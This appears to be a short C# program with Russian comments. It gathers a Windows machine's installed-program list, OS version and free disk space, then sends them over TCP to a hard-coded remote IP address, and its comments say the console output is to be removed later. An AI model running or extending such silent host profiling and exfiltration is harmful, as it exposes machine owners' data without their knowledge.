using System.Net.Sockets;
using Microsoft.Win32;


// Код на получение программ

string displayName = "";
RegistryKey key;

key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall");
foreach (String keyName in key.GetSubKeyNames())
{
    RegistryKey subkey = key.OpenSubKey(keyName);
    displayName += subkey.GetValue("DisplayName") as string + "\n";
}

Console.WriteLine(displayName);// просто посмотреть для теста, потом эту строчку надо удалить 



string os = Environment.OSVersion.ToString();
Console.WriteLine(os.ToString());// просто посмотреть для теста, потом эту строчку надо удалить 

string driveInfo = string.Empty;
foreach (DriveInfo drive in DriveInfo.GetDrives())
{
    if (drive.IsReady)
    {
        double AvailableFreeSpace_Gb = Convert.ToDouble(((drive.AvailableFreeSpace / Convert.ToDouble(1024)) / Convert.ToDouble(1024)) / Convert.ToDouble(1024));
        AvailableFreeSpace_Gb = Math.Round(AvailableFreeSpace_Gb, 2);
        driveInfo += $"Диск {drive.Name}: Свободное место - {AvailableFreeSpace_Gb} Gb\n";
    }
}
Console.WriteLine(driveInfo); // просто посмотреть для теста, потом эту строчку надо удалить 


string data = $"Операционная система: {os}\nСвободное место на диске:\n{driveInfo}\n\nСписок программ:\n{displayName}"; // подготавливаем наши данные в переменную


TcpClient client = new TcpClient("26.194.255.228", 3333); // подключаемся к серверу и создаём клиента 

// Здесь данные должны отправляться на сервер 

StreamWriter writer = new StreamWriter(client.GetStream());
writer.WriteLine(data);
writer.Flush();
client.Close();



